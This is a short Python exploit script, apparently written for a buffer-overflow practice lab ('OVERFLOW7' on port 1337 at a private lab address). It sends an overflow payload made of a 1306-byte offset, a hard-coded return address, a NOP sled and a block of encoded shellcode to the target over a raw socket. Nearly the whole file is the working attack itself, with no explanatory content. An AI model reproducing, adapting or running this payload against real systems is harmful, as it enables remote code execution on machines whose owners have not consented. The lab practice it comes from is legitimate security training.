#!/usr/bin/env python3

import socket, sys


'''
Getting offset 
'''


ip = "10.10.42.175"
port = 1337

prefix = b"OVERFLOW7 "
offset = 1306
overflow = b"A" * offset
retn = b"\xf7\x11\x50\x62"
padding = b"\x90"*16      # used for giving some space to unpack encoding(in this case, shikataganai)

shellcode = b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xa0\x1e\xb9\x30\x83\xee\xfc\xe2\xf4\x5c\xf6\x3b\x30\xa0\x1e\xd9\xb9\x45\x2f\x79\x54\x2b\x4e\x89\xbb\xf2\x12\x32\x62\xb4\x95\xcb\x18\xaf\xa9\xf3\x16\x91\xe1\x15\x0c\xc1\x62\xbb\x1c\x80\xdf\x76\x3d\xa1\xd9\x5b\xc2\xf2\x49\x32\x62\xb0\x95\xf3\x0c\x2b\x52\xa8\x48\x43\x56\xb8\xe1\xf1\x95\xe0\x10\xa1\xcd\x32\x79\xb8\xfd\x83\x79\x2b\x2a\x32\x31\x76\x2f\x46\x9c\x61\xd1\xb4\x31\x67\x26\x59\x45\x56\x1d\xc4\xc8\x9b\x63\x9d\x45\x44\x46\x32\x68\x84\x1f\x6a\x56\x2b\x12\xf2\xbb\xf8\x02\xb8\xe3\x2b\x1a\x32\x31\x70\x97\xfd\x14\x84\x45\xe2\x51\xf9\x44\xe8\xcf\x40\x41\xe6\x6a\x2b\x0c\x52\xbd\xfd\x76\x8a\x02\xa0\x1e\xd1\x47\xd3\x2c\xe6\x64\xc8\x52\xce\x16\xa7\xe1\x6c\x88\x30\x1f\xb9\x30\x89\xda\xed\x60\xc8\x37\x39\x5b\xa0\xe1\x6c\x60\xf0\x4e\xe9\x70\xf0\x5e\xe9\x58\x4a\x11\x66\xd0\x5f\xcb\x2e\x5a\xa5\x76\xb3\x38\xd0\xe3\xd1\x32\xa0\x0f\xe5\xb9\x46\x74\xa9\x66\xf7\x76\x20\x95\xd4\x7f\x46\xe5\x25\xde\xcd\x3c\x5f\x50\xb1\x45\x4c\x76\x49\x85\x02\x48\x46\xe5\xc8\x7d\xd4\x54\xa0\x97\x5a\x67\xf7\x49\x88\xc6\xca\x0c\xe0\x66\x42\xe3\xdf\xf7\xe4\x3a\x85\x31\xa1\x93\xfd\x14\xb0\xd8\xb9\x74\xf4\x4e\xef\x66\xf6\x58\xef\x7e\xf6\x48\xea\x66\xc8\x67\x75\x0f\x26\xe1\x6c\xb9\x40\x50\xef\x76\x5f\x2e\xd1\x38\x27\x03\xd9\xcf\x75\xa5\x59\x2d\x8a\x14\xd1\x96\x35\xa3\x24\xcf\x75\x22\xbf\x4c\xaa\x9e\x42\xd0\xd5\x1b\x02\x77\xb3\x6c\xd6\x5a\xa0\x4d\x46\xe5"

#postfix = b""

payload = prefix + overflow + retn + padding + shellcode     #Add NOPs \x90

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print("Sending payload...")
    #s.recv(1024)
    s.send(payload + b'\r\n')
    #s.recv(1024)
    print("Done!")
    s.close

except:
    print("Cannot connect to server")
    sys.exit()
